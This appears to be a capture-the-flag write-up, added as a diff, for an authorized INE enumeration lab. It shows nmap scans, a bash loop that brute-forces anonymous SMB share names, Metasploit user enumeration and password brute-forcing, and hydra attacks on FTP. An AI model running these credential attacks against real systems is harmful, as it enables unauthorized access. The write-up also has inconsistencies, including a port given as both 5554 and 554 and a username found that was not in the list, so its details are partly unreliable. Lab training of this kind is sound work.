@@ -1,0 +1,143 @@
+#INE Assessment Methodologies: Enumeration CTF1
+>Authorized training lab
+**Target:** ‘target.ine.local
+**TOOLS:** ‘nmap’,  ‘smbclient’, Metaploit(‘smb_enumusers’, ‘smb_login’), ‘hydra’, ‘FTP’, ‘SSH’
+---
+##Step 0: Scan the target
+‘’’
+nmap -sC -sV -O <target-ip> -oX <filename>
+‘’’
+[screenshot]
+Samba matches the lab’s own hint abou the anonymous share, so that’s where I started.
+---
+---
+##Flag1: Anonymous Samba share
+##Listing shares
+‘’’
+Smbclient -L //<target-ip>
+‘’’
+[screen]
+**Why:** ‘-L’ asks the server to list every share it offers, without connecting  to  any of them.
+**Result:** only ‘print$’ and ‘IPC$’ showed up – the default administrative share, nohing that looks like the “anonymous share” from the hint. A share can exist on the server without tbeing advertised in this listing, so I couldn’t rule
+##Brute-forcing share names
+Since the obvious listing came up empty, I went  online and found a small script to try a wordlist of common share names directly, instead of relying on the server to tell me what exists.
+‘’’
+Nano share.sh
+‘’’
+‘’’
+#!/bin/bash
+
+# Path to your wordlist
+wordlist="/root/Desktop/wordlists/shares.txt"
+target="target.ine.local"
+
+# Loop through each share in the wordlist
+while read -r share; do
+  echo "Attempting anonymous login to share: $share"
+
+  # Try to connect anonymously
+  smbclient "\\\\$target\\$share" -U ""%"" -N
+
+  if [ $? -eq 0 ]; then
+    echo "[+] Anonymous access successful for share: $share"
+  else
+    echo "[-] Failed to access share: $share"
+  fi
+done < "$wordlist" 
+‘’’
+[screen]
+**How It works:**
+-	‘-U “%” ‘ passes an empty uername and password to ‘smbclient’, which is how you request an anonymous connection.
+-	‘-N’ supresses the password prompt so the loop doesn’t stop and wait  for input on every attempt 
+-	‘$?’ is the exit status of the last command; ‘smbclient’  returns ‘0’ on a successful connection and non-zero on failure, so checking it tells the script whether that share name was valid.
+‘’’
+Chmod +x <script>
+‘’’
+[screen]
+**Result: ** most names failed with ‘NT_STATUS_BAD_NETWORK_NAME’ (the share does’nt exit), but pubfiles succeeded.
+##Reading the share
+‘’’
+smbclient //<target-ip>/pubfiles
+‘’’
+‘’’
+smb: \> ls
+smb: \> more flag1.txt
+‘’’
+[screenshot]
+---
+---
+##Flag 2: A samba user with weak password
+The hint points at a private share named after a username, which means I first need valid usernames, then valid passwords.
+##Enumerating valid usernames 
+‘’’
+search smb_enumusers
+setg rhosts <target-ip>
+run
+‘’’
+[screenshot]
+**Why:**  ‘smb_enumusers’ queries the SMB service for local account names using the SAM Security Account Manger) protocol, without needing valid credentials first. This turns “ I don’t know any usernames” into a concrete list.
+**Resuts:** three usernames : ‘josh’, ‘nancy’, ‘bob’ I save these into ‘ users.txt’ for the next step.
+##Brute-forcing passwords for those usernames
+‘’’
+Set user_file users.txt
+set  pass_file <suggested wordlist>
+set verbose false
+run
+‘’’
+[screen]
+**How it works:** ‘smb_login’ takes every combination of the usernames and passwords in the files and attempts an SMB authentication with each pair, reporting the successful ones
+**Result: ** 5 valid credentials pairs came back, including  ‘josh:purple’ and ‘administrator:admin’, ‘josh’ is the one that matches the hint, since the private share for a “ bad password” user would be named after that user.
+‘’’
+smbclient \\\\<target-ip>\\josh -U josh
+‘’’
+```
+smb: \> ls
+smb: \> more flag2.txt
+```
+[screenshot]
+**Result:** the file contained the flag and a note
+[screenshot]
+
+---
+---
+Flag 2's note said to find an FTP service and check its banner. The original scan only checked the 1000 most common ports and didn't show one, so I scanned every port this time.
+‘’’
+nmap  -p- <target-ip> -sV
+‘’’
+[screen]
+**Why ‘-p’:* this scans all the 65535 TCP ports instead of default top 1000, A service hiding on an unusual port, like FTP here, is invisible to a default scan.
+**Results:** ‘vsftp 2.0.8 or later’ running on port **5554**, not the standard port 21.
+##Brute-forcing FTP credentials
+‘’’
+hydra -L users.txt -P /root/Desktop/wordlists/unix_passwords.txt  ftp://<target-ip>:5554
+‘’’
+**Result:** `alice:pretty` worked. Notice `alice` is a username that hadn't come up in the SMB enumeration, found only because the hint pointed me toward FTP specifically.
+[screen]
+‘’’
+ftp <target-ip> 554
+‘’’
+[screenshot]
+**Result:** the FTP banner itself read:
+```
+220 Welcome to blah FTP service. Reminder to users, specifically ashley, alice and amanda to change their weak passwords immediately!!!
+```
+
+That banner names three more users (`ashley`, `alice`, `amanda`) with weak passwords, which is exactly the kind of leak the hint told me to look for. Directory listing then showed `flag3.txt`.
+---
+---
+##Flag 4: The SSH login waring banner
+>  hint: this is a warning meant to deter unauthorized users from logging in
+##What I did
+‘’’
+ssh <target-ip>
+‘’’
+[screen]
+**Why:** "a warning meant to deter unauthorized users" is a very literal description of an SSH **pre-login banner** — the block of text a server can be configured to show before a user even enters credentials, usually for legal or policy reasons ("unauthorized access is prohibited", and so on).
+**Result:** the banner displayed the standard warning text, and the flag was embedded directly inside
+[screenshot]
+---
+
+
+
+
+
